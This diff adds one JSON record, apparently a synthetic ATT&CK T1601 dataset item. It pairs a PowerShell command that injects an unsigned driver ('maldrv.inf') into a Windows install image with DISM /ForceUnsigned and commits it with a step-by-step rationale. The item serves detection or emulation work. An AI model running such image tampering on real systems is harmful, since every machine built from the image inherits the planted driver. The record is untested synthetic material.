@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$pre=(Get-FileHash 'C:\\images\\install.wim' -Algorithm SHA256).Hash; dism /Image:C:\\mount /Add-Driver /Driver:C:\\staging\\maldrv.inf /ForceUnsigned | Out-Null; dism /Unmount-Image /MountDir:C:\\mount /Commit | Out-Null; $post=(Get-FileHash 'C:\\images\\install.wim' -Algorithm SHA256).Hash; if($pre -ne $post){Write-Output 'WIM modified by driver injection'}; certutil -hashfile C:\\images\\install.wim SHA256",
+  "explanation": "Adds an unsigned driver to the mounted image and commits the change, then verifies the WIM hash changed, demonstrating patching of the system image (T1601).",
+  "rationale_steps": [
+    "Record pre-modification WIM hash.",
+    "Inject unsigned driver into the offline image with DISM.",
+    "Commit changes by unmounting the image.",
+    "Re-hash and compare to confirm image modification and log via certutil."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-dc7ef01c-629ed91b",
+  "source_prompt_hash": "dc7ef01c",
+  "timestamp_utc": "2025-09-30T04:49:19.161651Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
